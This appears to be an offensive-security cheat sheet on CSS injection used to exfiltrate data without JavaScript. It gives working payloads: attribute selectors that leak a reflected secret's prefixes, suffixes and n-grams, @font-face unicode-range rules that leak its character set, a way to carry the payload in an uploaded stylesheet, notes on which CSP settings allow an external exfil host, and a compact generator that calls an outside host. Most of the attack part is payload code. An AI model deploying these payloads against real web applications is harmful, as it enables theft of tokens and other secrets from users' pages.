# CSS oracle — the declarative read-back channel

The sealed-shape oracle: no JS needed — a stylesheet's selectors
match a reflected secret and load a distinct URL per match. The
highest-bandwidth channel when script is blocked.

---

## 1. The mechanism — a selector that reads an attribute

```css
/* a CSS attribute selector matches a reflected secret's attribute */
body[secret^="ab"]{--m_ab:url('/leak/ab')}     /* prefix */
body[secret$="ef"]{--m_ef:url('/leak/ef')}     /* suffix */
body[secret*="abc"]{--m_abc:url('/leak/abc')}  /* substring */
#trig{background-image:var(--m_ab,none),var(--m_ef,none),var(--m_abc,none)}
```

A matching rule sets a CSS variable; a single element consumes them
all as background layers; the browser fetches exactly the layers
that resolved — the requested URLs ARE the matched selectors.

## 2. Why custom-property + multi-layer background — the scaling trick

```css
/* this DOESN'T work — only the last matching rule's bg wins: */
body[secret^="a"]{background:url('/a')}
body[secret^="b"]{background:url('/b')}  /* only one bg applies */

/* this DOES — a variable per rule, one element consumes them all: */
body[secret^="a"]{--a:url('/a')}
body[secret^="b"]{--b:url('/b')}
#trig{background-image:var(--a,none),var(--b,none)}
```

Thousands of selectors → one element's multi-layer background →
every matching selector's URL fetches → a character-SET leak.

## 3. The @font-face unicode-range variant — the character-set leak

```css
/* one @font-face per character, all sharing one family, each with
   its own unicode-range and its own URL */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
/* ... one per alphabet char */
#secret{font-family:x}
```

The browser downloads a face only when a char inside its
unicode-range is rendered — the requested URLs ARE the character
SET of the secret.

## 4. The visibility requirement — the element must render

```css
/* the secret's element must RENDER for its chars to trigger a
   font load — a hidden element loads nothing */
#secret{display:block !important}  /* override a d-none/hidden class */
```

## 5. The stylesheet-carrier — where the CSS lives

```text
an uploaded stylesheet — thousands of rules, tiny reflected payload:
  reflect '<link rel=stylesheet href="/paper/<id>"><div id=trig></div>'
  and put the thousands of rules in the uploaded file. NOT in the URL.
```

## 6. The CSP gates — what blocks the CSS oracle

```text
'unsafe-inline' in default-src allows styles even when script-src
'none' blocks script. font-src 'self' * (a host wildcard) allows an
external font host — the exfil URL. img-src 'self' blocks a
background-image exfil — but a font load is governed by font-src.
script-src 'none' blocks <script> AND the XSLT stylesheet fetch —
XSLT is governed by script-src, not a bypass.
```

## 7. The n-gram oracle — substring → full reconstruction

```css
/* a substring oracle answers 'does X occur' — ask for n-grams:
   all 1- and 2-char prefixes/suffixes plus every 3-gram */
body[secret*="abc"]{--abc:url('/leak/abc')}
/* thousands of rules — one per n-gram */
```

The matched n-grams reconstruct the secret via a beam search over
overlapping n-grams.

## 8. The control pair — always

```css
/* an always-matching selector + a never-matching — the channel check */
body[secret]{--yes:url('/leak/YES')}     /* always matches — secret exists */
body[nosuchattr]{--no:url('/leak/NO')}   /* never matches */
#trig{background-image:var(--yes,none),var(--no,none)}
```

The 'YES' URL should hit; 'NO' should never hit — if they don't
separate, the channel is broken.

## 9. The payload — a compact stylesheet

```css
/* a compact generator — one @font-face per char, one element */
@font-face{font-family:x;src:url('https://a/6'+i);unicode-range:U+00<i>}
/* i in 30..7a — digits+lowercase+uppercase */
```

## 10. The oracle-to-signal table — what each load tells you

```text
a font load on /leak/61       → the secret contains 'a' (unicode-range)
a bg load on /leak/ab         → the secret starts with 'ab' (prefix)
a bg load on /leak/abc        → 'abc' is a substring (n-gram)
a YES load + no NO load        → the channel works
a NO load                     → the channel is broken / misconfigured
```
